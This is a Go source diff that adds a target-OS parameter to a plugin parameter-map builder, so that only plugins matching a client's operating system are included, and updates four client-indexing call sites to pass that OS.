@@ -4421,24 +4421,26 @@ type EnrichedClient struct {
 	Protocol        string                         `json:"protocol"`
 }
 
-func buildPluginParamMap(serverRemark string) map[string]map[string][]string {
+func buildPluginParamMap(serverRemark, targetOS string) map[string]map[string][]string {
 	pluginParamMap := make(map[string]map[string][]string)
 	normalizedServerRemark := strings.TrimSpace(serverRemark)
+	normalizedOS := strings.ToLower(strings.TrimSpace(targetOS))
 	for j := range server_plugin.Plugins {
 		plugin := &server_plugin.Plugins[j]
 		if strings.TrimSpace(plugin.Remark) != normalizedServerRemark {
 			continue
 		}
-
-		osKey := strings.ToLower(strings.TrimSpace(plugin.OS))
-		if osKey == "" {
+		pluginOS := strings.ToLower(strings.TrimSpace(plugin.OS))
+		if pluginOS == "" {
 			continue
 		}
-
-		if pluginParamMap[osKey] == nil {
-			pluginParamMap[osKey] = make(map[string][]string)
+		if pluginOS != normalizedOS {
+			continue
 		}
-		pluginParamMap[osKey][plugin.CodeWord] = plugin.ParameterDesc
+		if pluginParamMap[pluginOS] == nil {
+			pluginParamMap[pluginOS] = make(map[string][]string)
+		}
+		pluginParamMap[pluginOS][plugin.CodeWord] = plugin.ParameterDesc
 	}
 	return pluginParamMap
 }
@@ -4451,7 +4453,7 @@ func UserIndex() []EnrichedClient {
 	defer serverPluginMu.RUnlock()
 	for i := range client_data.Clients {
 		client := &client_data.Clients[i]
-		pluginParamMap := buildPluginParamMap(client.Server)
+		pluginParamMap := buildPluginParamMap(client.Server,client.OS)
 		enriched := EnrichedClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4495,7 +4497,7 @@ func updateIndex(uid string) *EnrichedClient {
 	}
 
 	serverPluginMu.RLock()
-	pluginParamMap := buildPluginParamMap(clientCopy.Server)
+	pluginParamMap := buildPluginParamMap(clientCopy.Server,clientCopy.OS)
 	serverPluginMu.RUnlock()
 
 	enriched := EnrichedClient{
@@ -4558,7 +4560,7 @@ func windows_pro_UserIndex() []EnrichedWindowsClient {
 	defer serverPluginMu.RUnlock()
 	for i := range windows_client_data.Clients {
 		client := &windows_client_data.Clients[i]
-		pluginParamMap := buildPluginParamMap(client.Server)
+		pluginParamMap := buildPluginParamMap(client.Server,client.OS)
 		enriched := EnrichedWindowsClient{
 			Username:        client.Username,
 			Host:            client.Host,
@@ -4612,7 +4614,7 @@ func updateIndex_windows(uid string) *EnrichedWindowsClient {
 	}
 
 	serverPluginMu.RLock()
-	pluginParamMap := buildPluginParamMap(clientCopy.Server)
+	pluginParamMap := buildPluginParamMap(clientCopy.Server,clientCopy.OS)
 	serverPluginMu.RUnlock()
 
 	enriched := EnrichedWindowsClient{
